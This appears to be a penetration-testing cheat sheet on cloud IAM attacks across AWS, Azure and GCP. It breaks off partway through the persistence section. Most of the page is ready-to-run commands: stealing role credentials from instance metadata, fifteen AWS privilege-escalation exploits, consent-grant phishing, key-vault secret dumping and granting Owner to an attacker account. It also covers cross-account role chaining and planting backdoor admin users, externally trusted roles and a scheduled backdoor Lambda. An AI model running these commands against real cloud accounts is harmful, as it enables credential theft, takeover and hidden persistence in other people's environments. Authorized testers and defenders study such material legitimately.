---
title: IAM Attacks
description: Comprehensive guide for IAM Reconnaissance, Enumeration, Exploitation, Privilege Escalation, and Post-Exploitation techniques across AWS, Azure, and GCP.
navigation:
  icon: i-lucide-shield-alert
---

## Overview

IAM (Identity and Access Management) is the **backbone of cloud security**. Misconfigurations in IAM policies, roles, and permissions are the **#1 attack vector** in cloud environments.

::card-group

  :::card
  ---
  icon: i-lucide-search
  title: Reconnaissance
  to: "#reconnaissance"
  ---
  Discover IAM endpoints, users, roles, and identity providers.
  :::

  :::card
  ---
  icon: i-lucide-list
  title: Enumeration
  to: "#enumeration"
  ---
  Extract users, groups, policies, roles, and permissions.
  :::

  :::card
  ---
  icon: i-lucide-swords
  title: Attack Methods
  to: "#attack-methods"
  ---
  Privilege escalation, credential theft, policy abuse, and lateral movement.
  :::

  :::card
  ---
  icon: i-lucide-terminal
  title: Post-Exploitation
  to: "#post-exploitation"
  ---
  Persistence, backdoor creation, and data exfiltration.
  :::

::

---

## Methodology

::steps{level="3"}

### Phase 1 - Reconnaissance

Identify the target cloud environment, discover IAM endpoints, enumerate public-facing identity configurations.

### Phase 2 - Initial Access & Credential Harvesting

Gather credentials from exposed sources: metadata services, environment variables, code repos, phishing.

### Phase 3 - Enumeration

Map out users, groups, roles, policies, and trust relationships using harvested credentials.

### Phase 4 - Privilege Escalation

Identify and exploit overly permissive policies, role chaining, and misconfigured trust policies.

### Phase 5 - Lateral Movement

Assume roles across accounts, pivot through federated identities, exploit cross-account trusts.

### Phase 6 - Persistence & Exfiltration

Create backdoor users, access keys, modify policies, and exfiltrate sensitive data.

::

---

## Reconnaissance

### Target Identification

::note
Always start by identifying **which cloud provider** and **IAM configuration** the target uses before running any tools.
::

::tabs
  :::tabs-item{icon="i-lucide-eye" label="AWS"}
  ```bash [Identify AWS Account]
  # Check if target uses AWS
  dig txt _amazonses.target.com
  nslookup target.s3.amazonaws.com
  curl -s https://target.com | grep -i "amazonaws\|aws\|cognito"

  # Find AWS Account ID from public S3
  aws s3 ls s3://target-bucket --no-sign-request 2>&1

  # Check for exposed IAM endpoints
  curl -s http://169.254.169.254/latest/meta-data/iam/
  ```
  :::

  :::tabs-item{icon="i-lucide-eye" label="Azure"}
  ```bash [Identify Azure Tenant]
  # Enumerate Azure tenant
  curl -s https://login.microsoftonline.com/target.com/.well-known/openid-configuration | jq .

  # Get Tenant ID
  curl -s https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration | jq -r '.authorization_endpoint' | cut -d'/' -f4

  # Check Azure AD endpoints
  curl -s "https://autologon.microsoftazuread-sso.com/target.com/winauth/trust/2005/usernamemixed"
  ```
  :::

  :::tabs-item{icon="i-lucide-eye" label="GCP"}
  ```bash [Identify GCP Project]
  # Check for GCP metadata
  curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/project/project-id

  # Find GCP services
  dig txt _cloud-netblocks.googleusercontent.com
  curl -s https://target.com | grep -i "googleapis\|gstatic\|appspot"

  # Enumerate service accounts
  curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/
  ```
  :::
::

### Credential Discovery

::warning
Exposed credentials are the **most common initial access vector**. Always check these sources first.
::

| Source | Location | Command |
|--------|----------|---------|
| Git Repos | `.env`, `config.yml`, `.aws/credentials` | `trufflehog git https://github.com/target/repo` |
| Docker Images | Environment vars, mounted secrets | `docker inspect <container>` |
| CI/CD Pipelines | Build logs, pipeline configs | Check Jenkins/GitHub Actions logs |
| SSRF → Metadata | `169.254.169.254` | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| Public S3/Blobs | Bucket policies, objects | `aws s3 ls s3://bucket --no-sign-request` |
| JavaScript Files | Hardcoded API keys | `grep -r "AKIA\|ASIA" ./js/` |
| Error Messages | Stack traces, debug pages | Manual review |
| Phishing | OAuth consent, credential harvesting | `evilginx2`, `gophish` |

#### SSRF to IAM Credentials

```bash [AWS Metadata - IMDSv1]
# Classic SSRF to steal IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>

# Response contains:
# - AccessKeyId
# - SecretAccessKey
# - Token (Session Token)
# - Expiration
```

```bash [AWS Metadata - IMDSv2 Bypass]
# IMDSv2 requires token - harder but not impossible via SSRF
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

```bash [GCP Metadata]
# GCP metadata server
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Get access token for service account
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"
```

```bash [Azure Metadata - IMDS]
# Azure Instance Metadata Service
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Recon Tools

::code-group

```bash [ScoutSuite - Multi-Cloud]
# Install
pip install scoutsuite

# AWS Audit
scout aws --profile target-profile

# Azure Audit
scout azure --cli

# GCP Audit
scout gcp --user-account
```

```bash [Prowler - AWS]
# Install
pip install prowler

# Run full AWS security audit
prowler aws -p target-profile

# Specific IAM checks
prowler aws -p target-profile -c iam
prowler aws -p target-profile --checks-file iam_checks.txt
```

```bash [CloudMapper - AWS]
# Visualize AWS IAM
cloudmapper collect --account target-account
cloudmapper report --account target-account
cloudmapper iam_report --account target-account
```

```bash [Pacu - AWS Exploitation]
# AWS exploitation framework
pip install pacu

# Launch
pacu

# Set keys
set_keys
# Enter AccessKeyId, SecretAccessKey, SessionToken
```

::

---

## Enumeration

### AWS IAM Enumeration

::tip
Start with `get-caller-identity` — it **always works** regardless of permissions and reveals your identity.
::

::steps{level="4"}

#### Step 1 - Identify Current Identity

```bash [whoami equivalent]
# ALWAYS run this first - works with ANY valid credentials
aws sts get-caller-identity

# Output:
# {
#   "UserId": "AIDAXXXXXXXXXXX",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/compromised-user"
# }

# Check if using assumed role
aws sts get-caller-identity --query 'Arn' --output text
```

#### Step 2 - Enumerate Users

```bash [List Users & Details]
# List all IAM users
aws iam list-users
aws iam list-users --query 'Users[*].[UserName,UserId,CreateDate]' --output table

# Get specific user details
aws iam get-user --user-name target-user

# List user's access keys
aws iam list-access-keys --user-name target-user

# List user's MFA devices
aws iam list-mfa-devices --user-name target-user

# Get user's login profile (console access)
aws iam get-login-profile --user-name target-user

# List SSH public keys
aws iam list-ssh-public-keys --user-name target-user

# List signing certificates
aws iam list-signing-certificates --user-name target-user
```

#### Step 3 - Enumerate Groups

```bash [List Groups & Memberships]
# List all groups
aws iam list-groups

# List groups for a specific user
aws iam list-groups-for-user --user-name target-user

# List users in a group
aws iam get-group --group-name Admins

# List policies attached to group
aws iam list-attached-group-policies --group-name Admins
aws iam list-group-policies --group-name Admins
```

#### Step 4 - Enumerate Roles

```bash [List Roles & Trust Policies]
# List all roles
aws iam list-roles
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table

# Get role details and trust policy
aws iam get-role --role-name target-role

# List policies attached to role
aws iam list-attached-role-policies --role-name target-role
aws iam list-role-policies --role-name target-role

# Get inline policy for role
aws iam get-role-policy --role-name target-role --policy-name inline-policy-name
```

#### Step 5 - Enumerate Policies

```bash [List & Analyze Policies]
# List all policies
aws iam list-policies --scope Local
aws iam list-policies --only-attached

# Get policy details
aws iam get-policy --policy-arn arn:aws:iam::123456789012:policy/CustomPolicy

# Get policy version (actual permissions)
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/CustomPolicy \
  --version-id v1

# List all policy versions
aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/CustomPolicy

# Get all policies attached to current user
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
aws iam list-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
```

::

#### Automated AWS Enumeration

::code-group

```bash [enumerate-iam.py]
# Fast permission enumeration via brute-force API calls
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip install -r requirements.txt

# Run enumeration
python enumerate-iam.py \
  --access-key AKIAXXXXXXXXXXXXXXXX \
  --secret-key XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
  --session-token XXXXXXXX
```

```bash [Pacu Modules]
# Using Pacu for automated enum
pacu

# Enumerate everything
run iam__enum_users_roles_policies_groups
run iam__enum_permissions
run iam__enum_assume_role

# Bruteforce permissions
run iam__bruteforce_permissions
```

```bash [WeirdAAL]
# AWS Attack Library
git clone https://github.com/carnal0wnage/weirdAAL.git
cd weirdAAL
pip install -r requirements.txt

# Configure
cp env.sample .env
# Edit .env with credentials

# Run recon
python3 weirdAAL.py -m recon_all -t target
```

```python [boto3 Script]
import boto3
import json

# Custom enumeration script
session = boto3.Session(
    aws_access_key_id='AKIAXXXXXXXX',
    aws_secret_access_key='XXXXXXXX',
    aws_session_token='XXXXXXXX'  # if temp creds
)

iam = session.client('iam')

# Enumerate users
users = iam.list_users()['Users']
for user in users:
    print(f"\n[+] User: {user['UserName']}")
    
    # Get attached policies
    policies = iam.list_attached_user_policies(
        UserName=user['UserName']
    )['AttachedPolicies']
    
    for policy in policies:
        print(f"    Policy: {policy['PolicyName']}")
        
        # Get policy document
        policy_version = iam.get_policy(
            PolicyArn=policy['PolicyArn']
        )['Policy']['DefaultVersionId']
        
        doc = iam.get_policy_version(
            PolicyArn=policy['PolicyArn'],
            VersionId=policy_version
        )['PolicyVersion']['Document']
        
        print(json.dumps(doc, indent=2))
```

::

### Azure AD Enumeration

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Az CLI"}
  ```bash [Azure AD Enum]
  # Login
  az login
  # Or with stolen token
  az login --service-principal -u <APP_ID> -p <SECRET> --tenant <TENANT_ID>

  # Current identity
  az account show
  az ad signed-in-user show

  # Enumerate users
  az ad user list --output table
  az ad user list --query '[].{Name:displayName,UPN:userPrincipalName,ID:id}' -o table

  # Enumerate groups
  az ad group list --output table
  az ad group member list --group "Global Admins" -o table

  # Enumerate service principals
  az ad sp list --all --output table
  az ad sp list --query '[].{Name:displayName,AppId:appId,ID:id}' -o table

  # Enumerate applications
  az ad app list --all
  az ad app list --query '[].{Name:displayName,AppId:appId}' -o table

  # Enumerate role assignments
  az role assignment list --all -o table
  az role assignment list --assignee <USER_ID> -o table

  # Enumerate role definitions
  az role definition list --custom-role-only -o table
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="PowerShell"}
  ```powershell [AzureAD PowerShell]
  # Install modules
  Install-Module AzureAD
  Install-Module Az

  # Connect
  Connect-AzureAD
  Connect-AzAccount

  # Enumerate users
  Get-AzureADUser -All $true | Select DisplayName, UserPrincipalName, ObjectId

  # Enumerate groups
  Get-AzureADGroup -All $true
  Get-AzureADGroupMember -ObjectId <GROUP_ID>

  # Enumerate roles
  Get-AzureADDirectoryRole
  Get-AzureADDirectoryRoleMember -ObjectId <ROLE_ID>

  # Enumerate service principals
  Get-AzureADServicePrincipal -All $true

  # Enumerate app registrations
  Get-AzureADApplication -All $true

  # Check Global Admin members
  $role = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"}
  Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ROADtools"}
  ```bash [ROADtools - Azure AD]
  # Install
  pip install roadtools
  pip install roadrecon

  # Authenticate
  roadrecon auth -u user@target.com -p 'Password123'
  # Or with access token
  roadrecon auth --access-token <TOKEN>

  # Gather all data
  roadrecon gather

  # Start web GUI
  roadrecon gui

  # Analyze
  roadrecon plugin policies
  ```
  :::
::

### GCP IAM Enumeration

```bash [GCP IAM Enum]
# Authenticate
gcloud auth activate-service-account --key-file=key.json
# Or with access token
gcloud auth login

# Current identity
gcloud auth list
gcloud config list account

# Enumerate IAM policy for project
gcloud projects get-iam-policy <PROJECT_ID>

# List service accounts
gcloud iam service-accounts list
gcloud iam service-accounts describe <SA_EMAIL>

# List service account keys
gcloud iam service-accounts keys list --iam-account=<SA_EMAIL>

# List custom roles
gcloud iam roles list --project=<PROJECT_ID>
gcloud iam roles describe <ROLE_NAME> --project=<PROJECT_ID>

# List organization roles
gcloud organizations get-iam-policy <ORG_ID>

# Test permissions
gcloud asset search-all-iam-policies --scope=projects/<PROJECT_ID>

# Enumerate permissions for service account
gcloud projects get-iam-policy <PROJECT_ID> \
  --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount:<SA_EMAIL>" \
  --format="table(bindings.role)"
```

---

## Attack Methods

### AWS Privilege Escalation

::caution
These techniques exploit **real misconfigurations**. Use only in authorized pentests.
::

::accordion

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 1: iam:CreatePolicyVersion"
  ---
  If a user can create a new policy version, they can define their own permissions.

  ```bash [Exploit]
  # Create a new policy version with admin access
  aws iam create-policy-version \
    --policy-arn arn:aws:iam::123456789012:policy/target-policy \
    --policy-document '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }]
    }' \
    --set-as-default
  ```

  **Required Permission:** `iam:CreatePolicyVersion`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 2: iam:SetDefaultPolicyVersion"
  ---
  Switch to an older, more permissive policy version.

  ```bash [Exploit]
  # List all versions
  aws iam list-policy-versions --policy-arn <POLICY_ARN>

  # Set a more permissive version as default
  aws iam set-default-policy-version \
    --policy-arn <POLICY_ARN> \
    --version-id v1
  ```

  **Required Permission:** `iam:SetDefaultPolicyVersion`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 3: iam:AttachUserPolicy"
  ---
  Attach AdministratorAccess policy directly to your user.

  ```bash [Exploit]
  aws iam attach-user-policy \
    --user-name compromised-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  ```

  **Required Permission:** `iam:AttachUserPolicy`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 4: iam:AttachGroupPolicy"
  ---
  Attach admin policy to a group you belong to.

  ```bash [Exploit]
  # Check your groups
  aws iam list-groups-for-user --user-name compromised-user

  # Attach admin policy to your group
  aws iam attach-group-policy \
    --group-name my-group \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  ```

  **Required Permission:** `iam:AttachGroupPolicy`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 5: iam:AttachRolePolicy + sts:AssumeRole"
  ---
  Attach admin policy to a role, then assume it.

  ```bash [Exploit]
  # Attach admin policy to role
  aws iam attach-role-policy \
    --role-name target-role \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

  # Assume the role
  aws sts assume-role \
    --role-arn arn:aws:iam::123456789012:role/target-role \
    --role-session-name pwned
  ```

  **Required Permissions:** `iam:AttachRolePolicy`, `sts:AssumeRole`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 6: iam:PutUserPolicy"
  ---
  Add an inline admin policy to your user.

  ```bash [Exploit]
  aws iam put-user-policy \
    --user-name compromised-user \
    --policy-name admin-inline \
    --policy-document '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }]
    }'
  ```

  **Required Permission:** `iam:PutUserPolicy`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 7: iam:PutGroupPolicy"
  ---
  Add inline admin policy to your group.

  ```bash [Exploit]
  aws iam put-group-policy \
    --group-name my-group \
    --policy-name admin-inline \
    --policy-document '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }]
    }'
  ```

  **Required Permission:** `iam:PutGroupPolicy`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 8: iam:PutRolePolicy"
  ---
  Add inline admin policy to a role, then assume it.

  ```bash [Exploit]
  aws iam put-role-policy \
    --role-name target-role \
    --policy-name admin-inline \
    --policy-document '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }]
    }'

  # Assume the role
  aws sts assume-role \
    --role-arn arn:aws:iam::123456789012:role/target-role \
    --role-session-name escalated
  ```

  **Required Permissions:** `iam:PutRolePolicy`, `sts:AssumeRole`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 9: iam:CreateAccessKey"
  ---
  Create new access keys for another user (including admins).

  ```bash [Exploit]
  # Create access keys for admin user
  aws iam create-access-key --user-name admin-user

  # Use the new credentials
  export AWS_ACCESS_KEY_ID=<new-key>
  export AWS_SECRET_ACCESS_KEY=<new-secret>
  aws sts get-caller-identity
  ```

  **Required Permission:** `iam:CreateAccessKey`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 10: iam:CreateLoginProfile"
  ---
  Create console password for a user without one.

  ```bash [Exploit]
  aws iam create-login-profile \
    --user-name admin-user \
    --password 'P@ssw0rd123!' \
    --no-password-reset-required
  ```

  **Required Permission:** `iam:CreateLoginProfile`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 11: iam:UpdateLoginProfile"
  ---
  Reset an existing user's console password.

  ```bash [Exploit]
  aws iam update-login-profile \
    --user-name admin-user \
    --password 'NewP@ssw0rd!' \
    --no-password-reset-required
  ```

  **Required Permission:** `iam:UpdateLoginProfile`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 12: iam:UpdateAssumeRolePolicy"
  ---
  Modify a role's trust policy to allow yourself to assume it.

  ```bash [Exploit]
  aws iam update-assume-role-policy \
    --role-name admin-role \
    --policy-document '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::123456789012:user/compromised-user"
        },
        "Action": "sts:AssumeRole"
      }]
    }'

  # Now assume the role
  aws sts assume-role \
    --role-arn arn:aws:iam::123456789012:role/admin-role \
    --role-session-name pwned
  ```

  **Required Permission:** `iam:UpdateAssumeRolePolicy`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 13: Lambda + iam:PassRole"
  ---
  Create a Lambda function that runs with a privileged role.

  ```bash [Exploit]
  # Create malicious Lambda function
  cat > /tmp/lambda.py << 'EOF'
  import boto3

  def handler(event, context):
      iam = boto3.client('iam')
      iam.attach_user_policy(
          UserName='compromised-user',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
      )
      return 'Escalated!'
  EOF

  cd /tmp && zip lambda.zip lambda.py

  # Create function with privileged role
  aws lambda create-function \
    --function-name privesc \
    --runtime python3.9 \
    --role arn:aws:iam::123456789012:role/admin-role \
    --handler lambda.handler \
    --zip-file fileb://lambda.zip

  # Invoke it
  aws lambda invoke --function-name privesc /tmp/output.txt
  ```

  **Required Permissions:** `lambda:CreateFunction`, `lambda:InvokeFunction`, `iam:PassRole`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 14: EC2 + iam:PassRole"
  ---
  Launch an EC2 instance with a privileged instance profile.

  ```bash [Exploit]
  # Create instance profile
  aws iam create-instance-profile --instance-profile-name pwned-profile
  aws iam add-role-to-instance-profile \
    --instance-profile-name pwned-profile \
    --role-name admin-role

  # Launch EC2 with privileged role
  aws ec2 run-instances \
    --image-id ami-0abcdef1234567890 \
    --instance-type t2.micro \
    --iam-instance-profile Name=pwned-profile \
    --key-name my-key

  # SSH in and use the role's credentials
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
  ```

  **Required Permissions:** `ec2:RunInstances`, `iam:PassRole`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Method 15: iam:CreateRole + sts:AssumeRole"
  ---
  Create a new admin role and assume it.

  ```bash [Exploit]
  # Create role with trust for your user
  aws iam create-role \
    --role-name backdoor-role \
    --assume-role-policy-document '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::123456789012:user/compromised-user"},
        "Action": "sts:AssumeRole"
      }]
    }'

  # Attach admin policy
  aws iam attach-role-policy \
    --role-name backdoor-role \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

  # Assume the role
  aws sts assume-role \
    --role-arn arn:aws:iam::123456789012:role/backdoor-role \
    --role-session-name admin
  ```

  **Required Permissions:** `iam:CreateRole`, `iam:AttachRolePolicy`, `sts:AssumeRole`
  :::

::

### AWS Privilege Escalation Summary Table

| # | Method | Required Permissions |
|---|--------|---------------------|
| 1 | Create Policy Version | `iam:CreatePolicyVersion` |
| 2 | Set Default Policy Version | `iam:SetDefaultPolicyVersion` |
| 3 | Attach User Policy | `iam:AttachUserPolicy` |
| 4 | Attach Group Policy | `iam:AttachGroupPolicy` |
| 5 | Attach Role Policy + Assume | `iam:AttachRolePolicy`, `sts:AssumeRole` |
| 6 | Put User Policy | `iam:PutUserPolicy` |
| 7 | Put Group Policy | `iam:PutGroupPolicy` |
| 8 | Put Role Policy | `iam:PutRolePolicy`, `sts:AssumeRole` |
| 9 | Create Access Key | `iam:CreateAccessKey` |
| 10 | Create Login Profile | `iam:CreateLoginProfile` |
| 11 | Update Login Profile | `iam:UpdateLoginProfile` |
| 12 | Update Assume Role Policy | `iam:UpdateAssumeRolePolicy` |
| 13 | Lambda + PassRole | `lambda:CreateFunction`, `iam:PassRole` |
| 14 | EC2 + PassRole | `ec2:RunInstances`, `iam:PassRole` |
| 15 | Create Role + Assume | `iam:CreateRole`, `sts:AssumeRole` |
| 16 | CloudFormation + PassRole | `cloudformation:CreateStack`, `iam:PassRole` |
| 17 | Glue + PassRole | `glue:CreateDevEndpoint`, `iam:PassRole` |
| 18 | SageMaker + PassRole | `sagemaker:CreateNotebookInstance`, `iam:PassRole` |
| 19 | DataPipeline + PassRole | `datapipeline:CreatePipeline`, `iam:PassRole` |
| 20 | SSM Run Command | `ssm:SendCommand` |
| 21 | CodeBuild + PassRole | `codebuild:CreateProject`, `iam:PassRole` |

### Azure Privilege Escalation

::accordion

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Azure: Application Admin to Global Admin"
  ---
  ```powershell [Exploit]
  # If you have Application Administrator role
  # Create a new service principal with Global Admin

  # Add credentials to existing high-priv app
  $password = New-AzureADApplicationPasswordCredential \
    -ObjectId <APP_OBJECT_ID> \
    -CustomKeyIdentifier "Backdoor" \
    -EndDate (Get-Date).AddYears(10)

  # Use the new credentials to get admin access
  $creds = New-Object System.Management.Automation.PSCredential(
    "<APP_ID>",
    (ConvertTo-SecureString $password.Value -AsPlainText -Force)
  )

  Connect-AzureAD -TenantId <TENANT_ID> -Credential $creds
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Azure: Managed Identity Abuse"
  ---
  ```bash [Exploit]
  # From compromised VM/App Service with Managed Identity
  # Get access token
  curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    | jq -r '.access_token'

  # Use token with Azure CLI
  az login --identity
  az role assignment list --all

  # Or use token directly
  curl -H "Authorization: Bearer <TOKEN>" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01"
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Azure: Consent Grant Attack"
  ---
  ```bash [Exploit]
  # Create malicious app with broad permissions
  # Trick admin into granting consent

  # Using 365-Stealer or similar tool
  python 365-stealer.py \
    --client-id <APP_ID> \
    --client-secret <SECRET> \
    --tenant-id <TENANT_ID>

  # Requested permissions:
  # - Mail.Read
  # - Files.ReadWrite.All
  # - User.Read.All
  # - Directory.Read.All
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Azure: Key Vault Access"
  ---
  ```bash [Exploit]
  # List key vaults
  az keyvault list

  # List secrets
  az keyvault secret list --vault-name <VAULT_NAME>

  # Get secret value
  az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME>

  # List keys
  az keyvault key list --vault-name <VAULT_NAME>

  # List certificates
  az keyvault certificate list --vault-name <VAULT_NAME>
  ```
  :::

::

### GCP Privilege Escalation

::accordion

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "GCP: Service Account Key Creation"
  ---
  ```bash [Exploit]
  # Create new key for privileged service account
  gcloud iam service-accounts keys create /tmp/key.json \
    --iam-account=admin-sa@project.iam.gserviceaccount.com

  # Authenticate with the new key
  gcloud auth activate-service-account \
    --key-file=/tmp/key.json

  # Verify access
  gcloud projects get-iam-policy <PROJECT_ID>
  ```

  **Required Permission:** `iam.serviceAccountKeys.create`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "GCP: Service Account Impersonation"
  ---
  ```bash [Exploit]
  # Impersonate a service account
  gcloud auth print-access-token \
    --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com

  # Use impersonation for commands
  gcloud compute instances list \
    --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com
  ```

  **Required Permission:** `iam.serviceAccounts.getAccessToken`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "GCP: setIamPolicy on Project"
  ---
  ```bash [Exploit]
  # Grant yourself Owner role
  gcloud projects add-iam-policy-binding <PROJECT_ID> \
    --member="user:attacker@gmail.com" \
    --role="roles/owner"

  # Or grant to service account
  gcloud projects add-iam-policy-binding <PROJECT_ID> \
    --member="serviceAccount:compromised@project.iam.gserviceaccount.com" \
    --role="roles/editor"
  ```

  **Required Permission:** `resourcemanager.projects.setIamPolicy`
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "GCP: Cloud Function + ActAs"
  ---
  ```bash [Exploit]
  # Deploy function with privileged SA
  gcloud functions deploy privesc \
    --runtime python39 \
    --trigger-http \
    --service-account admin-sa@project.iam.gserviceaccount.com \
    --source ./malicious-function/

  # Invoke the function
  gcloud functions call privesc
  ```

  **Required Permissions:** `cloudfunctions.functions.create`, `iam.serviceAccounts.actAs`
  :::

::

---

## Cross-Account / Lateral Movement

### AWS Cross-Account Role Assumption

```bash [Cross-Account Movement]
# Enumerate roles that trust external accounts
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS!=`null`]]' --output json

# Assume role in another account
aws sts assume-role \
  --role-arn arn:aws:iam::TARGET_ACCOUNT_ID:role/CrossAccountRole \
  --role-session-name lateral-movement \
  --external-id ExternalIdIfRequired

# Configure the new credentials
export AWS_ACCESS_KEY_ID=<returned-access-key>
export AWS_SECRET_ACCESS_KEY=<returned-secret-key>
export AWS_SESSION_TOKEN=<returned-session-token>

# Verify new identity
aws sts get-caller-identity
```

### AWS Role Chaining

```bash [Role Chaining]
# Assume Role A
CREDS_A=$(aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_A:role/RoleA \
  --role-session-name step1 --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS_A | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS_A | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS_A | jq -r '.Credentials.SessionToken')

# From Role A, assume Role B in another account
CREDS_B=$(aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_B:role/RoleB \
  --role-session-name step2 --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS_B | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS_B | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS_B | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
```

---

## Post-Exploitation

### Persistence Techniques

::warning
These techniques create **backdoors** in the target environment. Document everything for your report.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="AWS Persistence"}
  ```bash [AWS Backdoor Methods]
  # 1. Create backdoor IAM user
  aws iam create-user --user-name backup-service
  aws iam create-access-key --user-name backup-service
  aws iam attach-user-policy \
    --user-name backup-service \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

  # 2. Create backdoor role with external trust
  aws iam create-role \
    --role-name CloudAuditRole \
    --assume-role-policy-document '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
        "Action": "sts:AssumeRole"
      }]
    }'
  aws iam attach-role-policy \
    --role-name CloudAuditRole \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

  # 3. Add access key to existing user
  aws iam create-access-key --user-name existing-admin

  # 4. Create console access for service account
  aws iam create-login-profile \
    --user-name service-account \
    --password 'B@ckd00r!' \
    --no-password-reset-required

  # 5. Lambda persistence (CronJob)
  aws events put-rule \
    --name "daily-check" \
    --schedule-expression "rate(1 day)"
  aws events put-targets \
    --rule "daily-check" \
    --targets "Id"="1","Arn"="arn:aws:lambda:us-east-1:123456789012:function:backdoor"

  # 6. Modify existing role trust policy
  aws iam update-assume-role-policy \
    --role-name existing-role \
    --policy-document '{
      "Version": "2012-10-17",
      "Statement": [
